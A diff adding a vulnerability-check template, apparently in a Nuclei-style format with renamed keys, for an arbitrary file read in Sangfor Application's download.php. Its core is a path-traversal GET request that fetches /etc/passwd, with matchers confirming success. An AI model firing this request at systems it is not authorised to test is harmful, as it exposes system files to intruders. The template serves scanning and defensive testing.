@@ -1,0 +1,24 @@
+id: sangfor-download-lfi
+brief:
+    title: Sangfor Application download.php - Arbitary File Read
+    by: DhiyaneshDk
+    level: high
+    about: There is an arbitrary file reading vulnerability in the Sangfor Application download.php.
+    label:
+        - lfi
+        - sangfor
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/report/download.php?pdf=../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - application/force-download
+            - filename="passwd"
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
